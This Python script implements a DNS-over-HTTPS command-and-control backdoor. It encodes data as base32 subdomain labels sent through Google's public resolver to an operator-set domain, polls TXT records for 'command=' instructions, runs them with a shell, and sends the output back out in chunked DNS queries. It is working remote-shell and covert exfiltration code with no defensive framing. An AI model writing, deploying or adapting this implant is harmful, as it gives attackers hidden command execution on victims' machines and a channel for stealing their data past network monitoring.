import requests
import json
import base64
import subprocess
import time

def custom_base32_encode(data):
    try:
        # Base32 encoding
        encoded_bytes = base64.b32encode(data.encode('utf-8'))
        encoded_string = encoded_bytes.decode('utf-8')
        return encoded_string
    except Exception as e:
        print(f"Error encoding to Base32: {e}")
        return None

def custom_base32_decode(encoded_string):
    try:
        decoded_bytes = base64.b32decode(encoded_string)
        decoded_string = decoded_bytes.decode('utf-8')
        return decoded_string
    except Exception as e:
        print(f"Error decoding Base32: {e}")
        return None

def send_encoded_dns_query(data, domain_name):
    chunk_size = 50  # Define a reasonable chunk size
    encoded_data = custom_base32_encode(data)
    if not encoded_data:
        print("Failed to encode data to Base32.")
        return None

    if len(encoded_data) <= chunk_size:
        # No need to split the data
        flag = "SINGLE"
        chunked_domain_name = f"{flag}.0.{encoded_data}.{domain_name}"
        doh_url = f'https://dns.google.com/resolve?name={chunked_domain_name}&type=TXT'
        #doh_url = f'https://dns.belnet.be/dns-query?name={chunked_domain_name}&type=TXT'
        headers = {"Accept": "application/dns-json"}

        try:
            response = requests.get(doh_url, headers=headers)
            response.raise_for_status()
            return response.json()
        except requests.RequestException as e:
            print(f"Failed to send query: {str(e)}")
            return None
    else:
        # Split the encoded data into chunks
        chunks = [encoded_data[i:i + chunk_size] for i in range(0, len(encoded_data), chunk_size)]
        responses = []

        for i, chunk in enumerate(chunks):
            if i == 0:
                flag = "START"
            elif i == len(chunks) - 1:
                flag = "END"
            else:
                flag = "CONTINUE"

            chunked_domain_name = f"{flag}.{i}.{chunk}.{domain_name}"
            doh_url = f'https://dns.google.com/resolve?name={chunked_domain_name}&type=TXT'
            headers = {"Accept": "application/dns-json"}

            try:
                response = requests.get(doh_url, headers=headers)
                response.raise_for_status()
                responses.append(response.json())
            except requests.RequestException as e:
                print(f"Failed to send query: {str(e)}")
                return None

        return responses

def execute_command_from_dns(domain_name):
    while True:
        response = send_encoded_dns_query("COMMAND_REQUEST", domain_name)
        print("sending request")
        if response:
            txt_records = response.get("Answer", [])
            if txt_records:
                for txt_record in txt_records:
                    encoded_data = txt_record["data"]
                    decoded_data = custom_base32_decode(encoded_data)
                    print(f"decoded data is:",decoded_data)
                    if decoded_data and "command=" in decoded_data:
                        command = decoded_data.split("command=")[-1]
                        if command != "no_command":
                            print(f"Executing command: {command}")
                            result = subprocess.run(command, shell=True, capture_output=True, text=True)
                            print(f"Command output: {result.stdout}")
                            send_encoded_dns_query(result.stdout, domain_name)
                            time.sleep(15)
                        else:
                            print("No command received. Retrying...")
                            time.sleep(15)
            else:
                print("No TXT records received. Retrying...")
                time.sleep(15)
        else:
            print("No response received. Retrying...")
            time.sleep(15)

if __name__ == "__main__":
    domain_name = "send.example.com"  # Replace after 'send' with your domain
    execute_command_from_dns(domain_name)
